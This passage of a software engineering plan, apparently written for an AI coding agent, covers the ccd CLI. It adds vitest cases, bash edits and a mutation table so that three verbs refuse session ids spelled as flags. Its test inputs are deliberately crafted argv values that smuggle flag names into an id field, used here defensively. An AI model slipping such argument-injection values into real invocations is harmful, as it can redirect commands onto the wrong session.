  head: (token) => `--expect ${token}`,
  tails: [DEC, DEC_R],
  usage: 'usage: ccd ws-expire --expect <token> --session <id> [--surface <word>] [--actor <text>] [--reason <text>]',
  id: EXP_ID,
  flagValues: [[`--expect --surface --session ${EXP_ID} ${DEC}`, 'ccd: bad token']],
};
const COLLECT: TokenVerbCase = {
  act: 'collect',
  call: 'cmd_ws_collect',
  head: (token) => `--expect ${token}`,
  tails: [DEC, DEC_R],
  usage: 'usage: ccd ws-collect --expect <token> --session <id> [--surface <word>] [--actor <text>] [--reason <text>]',
  id: COL_ID,
  flagValues: [[`--expect --surface --session ${COL_ID} ${DEC}`, 'ccd: bad token']],
};

interface Snapshot { readonly listing: string[]; readonly journal: Record<string, unknown>[]; readonly decoys: string[] }

/** Plants the decoy rows `agent` and `pwa` with node:fs. For ws-collect it also writes a plain file under `tmproots/`
 *  for each name in `witnessed`: the collector opens the reap lock for any name a witness file stands for, so a
 *  mutant that lets the name through shows as a lock. Sources ccd once, so anything sourcing writes is already in the
 *  snapshot it returns. */
function setup(v: TokenVerbCase, witnessed: readonly string[]): Snapshot {
  for (const d of DECOY_IDS) plantRow(h.home, d);
  if (v.act === 'collect') {
    const dir = path.join(regDirOf(h.home), 'tmproots');
    fs.mkdirSync(dir, { recursive: true });
    for (const n of witnessed) fs.writeFileSync(path.join(dir, n), 'not a witness\n');
  }
  h.sh('true');
  return { listing: regListing(h.home), journal: readJournal(h.home), decoys: decoyNames(h.home) };
}

/** The cases every token verb shares, registered inside that verb's own describe. */
function sharedCases(v: TokenVerbCase): void {
  const run = (argv: string): { code: number; stdout: string; stderr: string } => h.run(`${v.call} ${argv}`);
  /** The server's argv for `id`: the verb's keys, the id, then what the server appends. */
  const server = (id: string, tail: string): string => `${v.head(TOK)} --session ${q(id)} ${tail}`;

  /** Dies "bad session id" at exit 1, prints no document, and moves nothing: no reap lock, no journal line, no unit
   *  or pane call, and the registry exactly as it was. */
  const diesBadId = (argv: string, before: Snapshot): void => {
    const r = run(argv);
    expect(r.code, `${argv}\n${r.stdout}${r.stderr}`).toBe(1);
    expect(r.stdout, argv).toBe('');
    expect(linesOf(r.stderr), argv).toContain('ccd: bad session id');
    expect(reapLocks(h.home), `${argv}: a reap lock was created`).toEqual([]);
    expect(eventsOf(h.home, v.act), `${argv}: a ${v.act} line was journaled`).toEqual([]);
    expect(readJournal(h.home), argv).toEqual(before.journal);
    expect(h.calls(), `${argv}: a unit or pane call was made`).toEqual([]);
    expect(regListing(h.home), `${argv}: the registry changed`).toEqual(before.listing);
  };
  /** Answers the verb's usage line at exit 1, as it did before this task, and moves nothing. */
  const answersUsage = (argv: string, before: Snapshot): void => {
    const r = run(argv);
    expect(r.code, `${argv}\n${r.stdout}${r.stderr}`).toBe(1);
    expect(r.stdout, argv).toBe('');
    expect(linesOf(r.stderr), argv).toContain(`ccd: ${v.usage}`);
    expect(reapLocks(h.home), argv).toEqual([]);
    expect(regListing(h.home), argv).toEqual(before.listing);
  };

  it('an id of --actor, --surface or --reason never rebinds to the surface word', () => {
    const before = setup(v, [...DECOY_IDS, ...DASH_IDS]);
    for (const id of REBINDING) for (const tail of v.tails) diesBadId(server(id, tail), before);
    expect(decoyNames(h.home), 'the decoys stand as planted').toEqual(before.decoys);
  }, 120_000);

  it('an id of --expect, --child-of, --defer-expired or --session dies before any lock', () => {
    const before = setup(v, [...DECOY_IDS, ...DASH_IDS]);
    for (const id of LITERAL) for (const tail of v.tails) diesBadId(server(id, tail), before);
  }, 120_000);

  it("a lone trailing --session still answers today's usage line", () => {
    const before = setup(v, DECOY_IDS);
    for (const argv of [
      `${v.head(TOK)} --session`,
      `${v.head(TOK)} ${DEC} --session`,
      // A missing id in the middle: the arm takes `--surface` as the value, and the residue is still the wrong length.
      `${v.head(TOK)} --session ${DEC}`,
      `${v.head(TOK)} --session ${v.id} --expect`,
    ]) answersUsage(argv, before);
    // THE DEC LADDER STILL RUNS BEFORE THE ARITY RULE: the arm sends a lone key to the residue and refuses nothing
    // itself, so a blank --actor ahead of a lone --session still answers in the actor's own words.
    const r = run(`${v.head(TOK)} --actor ' ' --session`);
    expect(r.code, r.stdout + r.stderr).toBe(1);
    expect(linesOf(r.stderr)).toContain('ccd: --actor must be non-blank');
  }, 120_000);

  it("--session given twice still answers today's usage line", () => {
    const before = setup(v, DECOY_IDS);
    for (const argv of [
      `${v.head(TOK)} --session ${v.id} --session ${v.id}`,
      `${v.head(TOK)} --session demo-quiet-a --session demo-quiet-b ${DEC}`,
      `${v.head(TOK)} ${v.head(TOK)} --session ${v.id}`,
    ]) answersUsage(argv, before);
  }, 120_000);

  it("an identity pair out of the verb's order still answers today's usage line", () => {
    const before = setup(v, DECOY_IDS);
    for (const argv of [
      `--session ${v.id} ${v.head(TOK)}`,
      `${DEC} --session ${v.id} ${v.head(TOK)}`,
    ]) answersUsage(argv, before);
  }, 120_000);

  it('a token or run id spelled as a flag is taken whole, and refused as the malformed value it is', () => {
    setup(v, DECOY_IDS);
    for (const [argv, said] of v.flagValues) {
      const r = run(argv);
      expect(r.code, `${argv}\n${r.stdout}${r.stderr}`).toBe(1);
      expect(linesOf(r.stderr), argv).toContain(said);
      expect(reapLocks(h.home), argv).toEqual([]);
    }
    expect(readJournal(h.home).filter((e) => e['id'] !== v.id), 'a line names an id other than the real one').toEqual([]);
  }, 120_000);
}

describe('ws-reclaim takes --session whole: a flag-spelled id dies "bad session id" before the lock (path-identity spec §2.2, §2.4)', () => {
  sharedCases(RECLAIM);

  it("the server's argv for a real id still reaches the token check", () => {
    makeChild(h);
    const before = setup(RECLAIM, DECOY_IDS);
    // ws-reclaim checks its token right AFTER the id, and journals the refusal against that id: here, the REAL one.
    for (const tail of RECLAIM.tails) {
      const r = childReclaimVerb(h, 'x', { extra: tail });
      expect(r.code, `${tail}\n${r.stdout}${r.stderr}`).toBe(1);
      expect(linesOf(r.stderr), tail).toContain('ccd: bad token');
    }
    // Flags in any position, as before: the dec LEADING the verb's keys.
    const lead = h.run(`${RECLAIM.call} ${DEC} --expect x --child-of ${CHILD_RUN} --session ${CHILD_ID}`);
    expect(lead.code, lead.stdout + lead.stderr).toBe(1);
    expect(linesOf(lead.stderr)).toContain('ccd: bad token');
    expect(eventsOf(h.home, 'reclaim').map((e) => [e['outcome'], e['id'], e['refusal']]))
      .toEqual([...RECLAIM.tails, DEC].map(() => ['refused', CHILD_ID, 'token-malformed']));
    expect(reapLocks(h.home)).toEqual([]);
    expect(readJournal(h.home).filter((e) => isDecoy(e['id']))).toEqual([]);
    expect(decoyNames(h.home)).toEqual(before.decoys);
  }, 120_000);
});

describe('ws-expire takes --session whole: a flag-spelled id dies "bad session id" before the lock (path-identity spec §2.2, §2.4)', () => {
  sharedCases(EXPIRE);

  it("the server's argv for a real id still reaches the token check", () => {
    makeArchived(h);
    const before = setup(EXPIRE, DECOY_IDS);
    for (const tail of EXPIRE.tails) {
      // ws-expire checks its token BEFORE its id, so a malformed one dies first, in the words it always had.
      const bad = expireVerb(h, 'x', { extra: tail });
      expect(bad.code, `${tail}\n${bad.stdout}${bad.stderr}`).toBe(1);
      expect(linesOf(bad.stderr), tail).toContain('ccd: bad token');
      // A well-formed token the audit never minted: the REAL id binds, takes ITS lock, and is refused state-changed.
      const r = expireVerb(h, 'f'.repeat(64), { extra: tail });
      expect(r.code, `${tail}\n${r.stdout}${r.stderr}`).toBe(0);
      expect(docOf(r.stdout)['refused'], tail).toBe('state-changed');
    }
    const rows = eventsOf(h.home, 'expire');
    expect([...new Set(rows.map((e) => e['id']))], 'every expire line names the real id').toEqual([EXP_ID]);
    const refused = rows.filter((e) => e['outcome'] === 'refused');
    expect(refused.map((e) => [e['refusal'], decOf(e)['surface'], decOf(e)['actor']]))
      .toEqual(EXPIRE.tails.map(() => ['state-changed', 'agent', 'x']));
    expect(decOf(refused[1]!)['reason'], 'the dec with a reason reached the journal whole').toBe('r');
    expect(fs.existsSync(path.join(regDirOf(h.home), `.reap-${EXP_ID}.lock`)), 'the real id took its own lock').toBe(true);
    expect(reapLocks(h.home), 'and no other lock was taken').toHaveLength(1);
    expect(readJournal(h.home).filter((e) => isDecoy(e['id']))).toEqual([]);
    expect(decoyNames(h.home)).toEqual(before.decoys);
  }, 180_000);
});

describe('ws-collect takes --session whole: a flag-spelled id dies "bad session id" before the lock (path-identity spec §2.2, §2.4)', () => {
  sharedCases(COLLECT);

  // Linux only, as `ccd-ws-collect-verb.test.ts`'s end-to-end cases are: the state-changed half needs an evaluation
  // that answers collectable, and the collector is Linux-first.
  it.skipIf(!LINUX)("the server's argv for a real id still reaches the token check", () => {
    makeOrphan(h);
    const before = setup(COLLECT, DECOY_IDS);
    for (const tail of COLLECT.tails) {
      // ws-collect checks its token BEFORE its id, so a malformed one dies first, in the words it always had.
      const bad = collectVerb(h, 'nothex', { extra: tail });
      expect(bad.code, `${tail}\n${bad.stdout}${bad.stderr}`).toBe(1);
      expect(linesOf(bad.stderr), tail).toContain('ccd: bad token');
      // A well-formed token no audit minted: the REAL id binds, takes ITS lock, and is refused state-changed.
      const r = collectVerb(h, WRONG_TOKEN, { extra: tail });
      expect(r.code, `${tail}\n${r.stdout}${r.stderr}`).toBe(0);
      expect(docOf(r.stdout)['refused'], tail).toBe('state-changed');
    }
    const rows = eventsOf(h.home, 'collect');
    expect(rows.map((e) => [e['outcome'], e['id'], e['refusal'], decOf(e)['surface'], decOf(e)['actor']]))
      .toEqual(COLLECT.tails.map(() => ['refused', COL_ID, 'state-changed', 'agent', 'x']));
    expect(decOf(rows[1]!)['reason'], 'the dec with a reason reached the journal whole').toBe('r');
    expect(fs.existsSync(path.join(regDirOf(h.home), `.reap-${COL_ID}.lock`)), 'the real id took its own lock').toBe(true);
    expect(reapLocks(h.home), 'and no other lock was taken').toHaveLength(1);
    expect(readJournal(h.home).filter((e) => isDecoy(e['id']))).toEqual([]);
    expect(decoyNames(h.home)).toEqual(before.decoys);
  }, 180_000);
});
```

- [ ] **Step 2: Run it and see it fail**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-token-verbs-dash-id.test.ts)    # foreground, timeout >= 600000 ms; the subshell keeps the cwd at the workspace root
```

**Expected: FAIL in 9 cases.** In each of the three describes, these three cases are red:
- "an id of --actor, --surface or --reason…";
- "an id of --expect, --child-of, --defer-expired or --session…";
- "a token or run id spelled as a flag…".

These are predicted, not measured:
- **ws-reclaim, the rebinding case.** The first row (`--expect aaaa… --child-of 7 --session '--actor' --surface agent --actor x`) binds `agent`, opens `.reap-agent.lock`, and its locked evaluation answers a refusal at exit 0: `expected 0 to be 1`.
- **ws-reclaim, the literal case.** `--expect` stays literal and creates `.reap---expect.lock`: `expected 0 to be 1`.
- **ws-expire.** Both cases fail the same way.
- **ws-collect, the rebinding case.** The planted `tmproots/agent` opens `.reap-agent.lock`, and the evaluation answers `{"failed":"probe-unmeasured",…}` at exit 1, so the first red is `expected '{"failed":…}' to be ''`.
- **ws-collect, the literal case.** The planted `tmproots/--expect` opens `.reap---expect.lock`.
- **"a token or run id…".** It answers the usage line in place of `ccd: bad token` (`ccd: bad run id` for ws-reclaim's second row).

**PASS:** the lone, twice and order cases, and the three controls (collect's is skipped off Linux). They pin today's behaviour.

Record each measured first red in the ledger. A different KIND of failure, such as a crash in setup or an import error, is reported by slug, and this task STOPs.

- [ ] **Step 3: Implement the edits in `ccd/ccd`** (each located by its quoted content)

**(a) ws-reclaim's arm.** Before:

```bash
  while (( $# )); do
    case "$1" in
      --defer-expired) defer=1; shift ;;
```

After:

```bash
  while (( $# )); do
    case "$1" in
      # THE IDENTITY PAIRS ARE TAKEN WHOLE (path-identity spec §2.4). A key and its value go to `args` together, so a
      # value is never scanned again as a flag: an id of `--actor` no longer eats `--surface` and leaves the surface
      # word to bind as the id. A key with no value goes alone, and the exact-arity rule below refuses it, as it did.
      --expect|--child-of|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
      --defer-expired) defer=1; shift ;;
```

**(b) ws-reclaim's entry.** Before:

```bash
  # THE SESSION ID IS VALIDATED FIRST (spec §5.9). The two checks after it
  # journal their refusal against `$id`, so `$id` must already be a registry-safe
  # charset (no `/`). Seven dies stay unjournaled, each for its reason:
  #   - the usage die and the four --actor/--reason checks above, because no
  #     id is bound yet;
  #   - a malformed session id, because it is no id to journal against;
  #   - the python3 probe below, which cannot journal at all, because the
  #     journal's encoder (`_lc_json`) is python3.
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]]         || die "bad session id"
  [[ $token =~ ^[0-9a-f]{64}$ ]]         || _lc_refuse reclaim "$id" token-malformed "bad token"
```

After:

```bash
  # THE SESSION ID IS VALIDATED FIRST (spec §5.9). The two checks after it
  # journal their refusal against `$id`, so `$id` must already be a registry-safe
  # charset (no `/`) that spells no flag: `_reg_id_ok` refuses a leading `-`
  # (path-identity spec §2.4), so an id of `--expect` never reaches the reap lock.
  # Seven dies stay unjournaled, each for its reason:
  #   - the usage die and the four --actor/--reason checks above, because no
  #     id is bound yet;
  #   - a malformed session id, because it is no id to journal against;
  #   - the python3 probe below, which cannot journal at all, because the
  #     journal's encoder (`_lc_json`) is python3.
  _reg_id_ok "$id"                       || die "bad session id"
  [[ $token =~ ^[0-9a-f]{64}$ ]]         || _lc_refuse reclaim "$id" token-malformed "bad token"
```

**(c) ws-expire's arm.** Before:

```bash
    case "$1" in
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-expire --expect <token> --session <id> [--surface <word>] [--actor <text>] [--reason <text>]"
```

After:

```bash
    case "$1" in
      # THE IDENTITY PAIRS ARE TAKEN WHOLE, as in ws-reclaim's loop (path-identity spec §2.4): a key and its value go
      # to `args` together, and a key with no value goes alone, for the exact-arity rule below to refuse.
      --expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-expire --expect <token> --session <id> [--surface <word>] [--actor <text>] [--reason <text>]"
```

**(d) ws-expire's entry.** Before:

```bash
  [[ $token =~ ^[0-9a-f]{64}$ ]]         || die "bad token"
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]]         || die "bad session id"
  _json_str probe >/dev/null 2>&1 \
    || die "python3 unavailable — cannot quote the expiry record safely"
```

After:

```bash
  [[ $token =~ ^[0-9a-f]{64}$ ]]         || die "bad token"
  # NO FLAG SPELLING BINDS: `_reg_id_ok` refuses a leading `-` (path-identity spec §2.4), before the reap lock.
  _reg_id_ok "$id"                       || die "bad session id"
  _json_str probe >/dev/null 2>&1 \
    || die "python3 unavailable — cannot quote the expiry record safely"
```

**(e) ws-collect's arm.** Before:

```bash
    case "$1" in
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-collect --expect <token> --session <id> [--surface <word>] [--actor <text>] [--reason <text>]"
```

After:

```bash
    case "$1" in
      # THE IDENTITY PAIRS ARE TAKEN WHOLE, as in ws-reclaim's loop (path-identity spec §2.4): a key and its value go
      # to `args` together, and a key with no value goes alone, for the exact-arity rule below to refuse.
      --expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-collect --expect <token> --session <id> [--surface <word>] [--actor <text>] [--reason <text>]"
```

**(f) ws-collect's entry.** Before:

```bash
  [[ $token =~ ^[0-9a-f]{64}$ ]]                            || die "bad token"
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] && _ws_tmproot_id_ok "$id" || die "bad session id"
```

After:

```bash
  [[ $token =~ ^[0-9a-f]{64}$ ]]                            || die "bad token"
  # NO FLAG SPELLING BINDS (`_reg_id_ok`, path-identity spec §2.4), and no dot-leading name (`_ws_tmproot_id_ok`).
  _reg_id_ok "$id" && _ws_tmproot_id_ok "$id"               || die "bad session id"
```

Rules for these edits:
- No new `die` literal. Every `die` in the three bodies is one `SANCTIONED` already holds, so the count stays 16.
- No comment holds the text `die "`, because `child-reclaim.test.ts` and `collect-readers.test.ts` harvest that shape.
- Every backticked `_name` exists: `_reg_id_ok` (Task 1) and `_ws_tmproot_id_ok`.

- [ ] **Step 4: Restamp and check by content**

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"     # rc=0
grep -cF -- '--expect|--child-of|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;' ccd/ccd   # 1
grep -cF -- '--expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;' ccd/ccd             # 2
grep -cF '_reg_id_ok "$id"' ccd/ccd                                                                                   # 3
awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) \{/{f=$1} /^  \[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]/{print NR": "f}' ccd/ccd \
  | grep -c 'cmd_ws_reclaim\|cmd_ws_expire\|cmd_ws_collect'                                                           # 0
```

- [ ] **Step 5: Run the new file green**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-token-verbs-dash-id.test.ts)    # foreground, timeout >= 600000 ms; the subshell keeps the cwd at the workspace root
```

Expected: PASS. All 21 cases pass on Linux, which is seven per verb. Off Linux, collect's control is skipped.

- [ ] **Step 6: Mutation table**
  - Keep the restamped file outside the tree first, at a FIXED path, because shell variables do not survive between Bash calls: `mkdir -p "${TMPDIR:-/tmp}/ccrc-w1b-task2" && cp ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task2/ccd.task2"`.
  - Apply each mutation alone to `ccd/ccd` from the workspace root, run its command as `(cd server && <command>)` so the cwd stays at the root, and see the red. Then restore with `cp "${TMPDIR:-/tmp}/ccrc-w1b-task2/ccd.task2" ccd/ccd`, and check that the restore landed: `cmp ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task2/ccd.task2"` prints nothing.
  - Never use `git checkout -- ccd/ccd`: it would drop this task's uncommitted edits.
  - Every red text below was drafted, not measured. Measure each one and record it in the ledger.

| # | Mutation (exact edit in `ccd/ccd`) | Command | Expected red |
|---|---|---|---|
| T2.1 | `cmd_ws_reclaim`: delete the line `      --expect\|--child-of\|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;` | `./node_modules/.bin/vitest run test/ccd-token-verbs-dash-id.test.ts -t 'ws-reclaim takes'` | "an id of --actor…": `agent` binds, `.reap-agent.lock` is made, exit 0: `expected 0 to be 1`. "an id of --expect…": its `--defer-expired` rows answer usage (the defer arm eats the id). "a token or run id…": usage instead of `ccd: bad token` |
| T2.2 | `cmd_ws_expire`: delete its `      --expect\|--session) if …` line | `… -t 'ws-expire takes'` | "an id of --actor…": `agent` binds, `.reap-agent.lock`, exit 0. "a token or run id…": usage |
| T2.3 | `cmd_ws_collect`: delete its `      --expect\|--session) if …` line | `… -t 'ws-collect takes'` | "an id of --actor…": `agent` binds, and the planted `tmproots/agent` opens `.reap-agent.lock`. Stdout holds `{"failed":"probe-unmeasured",…}`: `expected '{"failed":…}' to be ''`. "a token or run id…": usage |
| T2.4 | `cmd_ws_reclaim`: `  _reg_id_ok "$id"                       \|\| die "bad session id"` becomes `  [[ $id =~ ^[A-Za-z0-9._-]+$ ]]         \|\| die "bad session id"` | `… -t 'ws-reclaim takes'` | "an id of --expect…": `.reap---expect.lock` is made, exit 0: `expected 0 to be 1`. "an id of --actor…": the same, with `.reap---actor.lock` |
| T2.5 | `cmd_ws_expire`: the same restore | `… -t 'ws-expire takes'` | the same two cases |
| T2.6 | `cmd_ws_collect`: `  _reg_id_ok "$id" && _ws_tmproot_id_ok "$id"               \|\| die "bad session id"` becomes `  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] && _ws_tmproot_id_ok "$id" \|\| die "bad session id"` | `… -t 'ws-collect takes'` | both id cases: the planted `tmproots/--actor` and `tmproots/--expect` open `.reap---actor.lock` and `.reap---expect.lock` |
| T2.7 | `cmd_ws_collect`: the entry becomes `  _reg_id_ok "$id"                       \|\| die "bad session id"` (the dot predicate dropped) | `./node_modules/.bin/vitest run test/ccd-ws-collect-verb.test.ts -t 'argv: four positionals only'` | the existing `--session .hidden` row answers `not-witnessed` at exit 0: `expected 0 to be 1` (Linux) |
| T2.8 | `cmd_ws_reclaim`'s arm: `else args+=("$1"); shift; fi ;;` becomes `else die "bad session id"; fi ;;` | `… -t 'ws-reclaim takes'` | "a lone trailing --session…": `expected [ 'ccd: bad session id', '' ] to include 'ccd: usage: ccd ws-reclaim …'` |
| T2.9 | The same arm: `else die "usage: ccd ws-reclaim --expect <token> --child-of <runId> --session <id> [--defer-expired] [--surface <word>] [--actor <text>] [--reason <text>]"; fi ;;` | `… -t 'ws-reclaim takes'` | "a lone trailing --session…", the blank-`--actor` row: `expected [ 'ccd: usage: …', '' ] to include 'ccd: --actor must be non-blank'`. The arm refused before the dec ladder ran |
| T2.10 | `cmd_ws_reclaim`'s arm pattern `--expect\|--child-of\|--session)` becomes `--child-of\|--session)` | `… -t 'ws-reclaim takes'` | "a token or run id…": the `--expect --surface` row answers usage instead of `ccd: bad token` |
| T2.11 | The same pattern becomes `--expect\|--session)` | `… -t 'ws-reclaim takes'` | "a token or run id…": the `--child-of --surface` row answers usage instead of `ccd: bad run id` |
| T2.12 | `cmd_ws_expire`'s arm pattern `--expect\|--session)` becomes `--session)` | `… -t 'ws-expire takes'` | "a token or run id…": usage instead of `ccd: bad token` |
| T2.13 | `cmd_ws_collect`'s arm pattern loses its `--expect` alternative, leaving `--session)` | `… -t 'ws-collect takes'` | "a token or run id…": usage instead of `ccd: bad token` (the `--surface` arm takes `--session` as its value) |

After the last row:

```bash
cp "${TMPDIR:-/tmp}/ccrc-w1b-task2/ccd.task2" ccd/ccd && cmp ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task2/ccd.task2" && rm -r "${TMPDIR:-/tmp}/ccrc-w1b-task2"
node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"                                                          # rc=0
(cd server && ./node_modules/.bin/vitest run test/ccd-token-verbs-dash-id.test.ts)                                # PASS
```

A mutation row that stays green is reported by slug, for example `t2-arm-pattern-unpinned`, together with the measured output. Never loosen or delete the case to fit.

- [ ] **Step 7: The other named suites and guards, unedited and green**

Run each command as `(cd server && <command>)` from the workspace root, so Step 8's root-relative paths still resolve. Run each in the foreground, with a timeout of at least 600000 ms. If a batch outruns that ceiling, run its files one per call. Re-run a CLAUDE.md load flake alone before calling it a break.

```bash
./node_modules/.bin/vitest run test/ccd-refusal-scan.test.ts test/collect-readers.test.ts test/child-reclaim.test.ts test/archived-expiry-policy.test.ts test/ccd-wsaudit-nonpoison.test.ts test/wsaudit.test.ts
./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier'
./node_modules/.bin/vitest run test/ccd-workspaces.test.ts -t 'routes EVERY bash call site'
./node_modules/.bin/vitest run test/ccdargv-dec-parity.test.ts test/ccd-child-reclaim-prelock-journal.test.ts
./node_modules/.bin/vitest run test/ccd-child-reclaim-verb.test.ts
./node_modules/.bin/vitest run test/ccd-child-reclaim-crumb.test.ts test/ccd-child-reclaim-hardening.test.ts test/ccd-child-reclaim-tail-contained.test.ts
./node_modules/.bin/vitest run test/ccd-child-reclaim-leaf-moved.test.ts test/ccd-child-reclaim-leaf-moved-resume.test.ts test/ccd-child-reclaim-recovery.test.ts
./node_modules/.bin/vitest run test/ccd-child-reclaim-audit.test.ts test/ccd-child-reclaim-done-kept.test.ts test/ccd-child-reclaim-gone-branch.test.ts test/ccd-child-reclaim-ladder.test.ts test/ccd-child-reclaim-leaf-rows.test.ts test/ccd-child-reclaim-row-generation.test.ts test/ccd-child-reclaim-silent-omission.test.ts
./node_modules/.bin/vitest run test/ccd-child-reclaim-tmproot-wait.test.ts test/ccd-child-reclaim-unmeasured-journal.test.ts test/ccd-child-reclaim-verb-reflogs.test.ts test/ccd-child-reclaim-verb-tail.test.ts test/ccd-child-reclaim-why-cap.test.ts test/ccd-child-reclaim-leaf-moved-expire.test.ts
./node_modules/.bin/vitest run test/ccd-reclaim-tail-refuted.test.ts test/ccd-expire-tail-refuted.test.ts test/ccd-review-335-pins.test.ts test/ccd-leaf-remove.test.ts test/ccd-child-tmproot-witness.test.ts test/ccd-child-tmproot-witness-drop.test.ts
./node_modules/.bin/vitest run test/ccd-ws-expire-audit.test.ts test/ccd-ws-expire-consent-branch.test.ts
./node_modules/.bin/vitest run test/ccd-ws-expire-verb.test.ts test/ccd-ws-expire-ladder.test.ts test/ccd-ws-expire-return-race.test.ts test/ccd-lifecycle-purge.test.ts
./node_modules/.bin/vitest run test/ccd-ws-collect-verb.test.ts test/ccd-ws-collect-reach.test.ts test/ccd-ws-collect-move.test.ts
./node_modules/.bin/vitest run test/ccd-ws-collect-order.test.ts test/ccd-ws-collect-reprove.test.ts test/ccd-ws-collect-resume.test.ts
./node_modules/.bin/vitest run test/ccd-collect-audit.test.ts test/ccd-collect-audit-resume.test.ts test/ccd-collect-audit-rungs.test.ts test/ccd-collect-idle-token.test.ts test/ccd-collect-quarantine.test.ts test/ccd-collect-record.test.ts test/ccd-collect-recycle-pins.test.ts
./node_modules/.bin/vitest run test/ccd-collect-race-admin.test.ts test/ccd-collect-race-crash.test.ts test/ccd-collect-race-forge.test.ts test/ccd-collect-race-ids.test.ts test/ccd-collect-race-spawn.test.ts test/ccd-collect-race-substrate.test.ts test/ccd-collect-rows.test.ts
./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts test/typecheck-tests.test.ts
```

Expected: PASS everywhere, with no file edited. In particular:
- `ccd-refusal-scan` keeps `SANCTIONED` at 16, and its body floors hold.
- `collect-readers` matches in both directions.
- `child-reclaim`'s pre-lock die needles still find `die "bad session id"`.
- The citation passes keep `'ccd/ccd': <n>` at Task 0's (c1) number.
- The spawn census sees no bash spawn in the new file.

If an existing file goes red, name it by slug and **STOP**. Never edit it (HARD BOUNDARY).

- [ ] **Step 8: Commit**

```bash
git status --short                      # only ccd/ccd (M) and server/test/ccd-token-verbs-dash-id.test.ts (??)
git add ccd/ccd server/test/ccd-token-verbs-dash-id.test.ts
git commit -F - <<'EOF'
fix(ccd): ws-reclaim, ws-expire and ws-collect take their id whole and refuse a dash-leading one

The server appends its decision flags after the id, and the three token
verbs' loops scanned the --session value again as a flag. An id of
--actor, --surface or --reason lost to the dec arm, and the sweeps'
surface word bound as the id. An id of --expect, --child-of, --session
or --branch (and, at ws-expire and ws-collect, --defer-expired) stayed
literal, passed the id regex, and could create a reap lock, which is
never unlinked, before the token refused. At ws-reclaim an id of
--defer-expired was eaten by that verb's own arm and answered the usage
line.

- Each loop takes --session and --expect (and ws-reclaim's --child-of)
  with its value as one pair into the residue. A key with no value goes
  alone, so the exact-arity and order checks still refuse a lone key, a
  duplicate and a wrong order in today's words, and the dec ladder still
  runs first.
- ws-reclaim's and ws-expire's entry check is _reg_id_ok, and
  ws-collect's is _reg_id_ok beside _ws_tmproot_id_ok. Each still dies
  "bad session id", before any journal line or lock.
- A token or run id spelled as a flag is now taken whole and refused as a
  malformed value, where it answered the usage line.

No die literal, refusal word or journal act is added (path-identity spec
sections 2.2 and 2.4).
EOF
```

Name these, by slug, in the wave-done: the byte change `flag-spelled-token-answers-a-malformed-value` (see the Goal), and the controls `token-verb-controls-use-a-wrong-token` and `collect-control-runs-on-linux-only`.

Name these, by slug, in the wave-done:
- the substantive departure `flag-spelled-token-answers-a-malformed-value`: a token or run id spelled as a flag is taken whole and refused as malformed (`bad token`, `bad run id`) where it answered the usage line, and at ws-reclaim that refusal is journaled against the real id (`token-malformed`, `run-id-malformed`) where the usage die journaled nothing. The server cannot compose such an argv;
- the extra pins `token-verb-controls-use-a-wrong-token` and `collect-control-runs-on-linux-only`.

---

### Task 3: stop never takes a flag spelling as a surface value, a token or an id

**Model routing:** `opus`, effort `high`.

**Why:**
- **Spec §2.2 (the stop row) and §2.4.** `cmd_stop` strips `--surface` from any position before its arity rule. A server built before W1a puts the pair after the id: `CCD_ARGV.stopId(id, s)` gives `['stop', id, '--surface', s]`.
  - An id that spells `--surface` therefore looks exactly like the key. `stop --surface --surface pwa` takes `--surface` as the word, and `pwa` is left over as the id. That is a redirect onto the console's surface word.
  - Any other dash-leading id (`--actor`, `-x`, …) stays the literal id and is stopped as one.
  - `cmd_stop` has no id-shape check at all today. It builds `$REG/$id.choicekept`, the unit name and the pane target from whatever arrives.
- **R2 (stop half).** A dash-leading `--surface` value is refused here and in ws-add only, in both spellings, with stop's existing usage literal. The eight `--session` verbs keep their surface grammar. `stop --surface pwa --surface` is refused by the arm's arity check, not by a post-loop id check. Case 2 pins that, and Task 12 records the spec correction.
- **R5.** stop refuses a dash-leading residue token, and applies `_reg_id_ok` to the composed id. Both refusals are a bare `die`.
- **R26.** The words are exactly `die "bad session id: $a"` for the residue and `die "bad session id: $id"` for the composed id. `cmd_stop` is in no `ccd-refusal-scan.test.ts` verb body, so `SANCTIONED` does not move. No refusal token, journal act or probe word is added.
- **R9 does not bind this task.** `cmd_stop` sits below `cmd_start()` and below every frozen corpus anchor, so it grows by 16 lines. Step 7 proves that no hunk lands above it.
- **R19.** The cases go in a NEW file. `ccd-session-state.test.ts` and `ccd-workspaces.test.ts` stay unedited.
- The real-binary matrix for stop (both builder orders, and `stopPair` positionally) is Task 10's. This task's cases source ccd through the harness.

**Entry (measured in Step 0):** Tasks 1 and 2 are committed on this branch: `_reg_id_ok` in `ccd/ccd`, `server/test/dashIdFixture.ts`, and Task 2's commit.

**Files:**
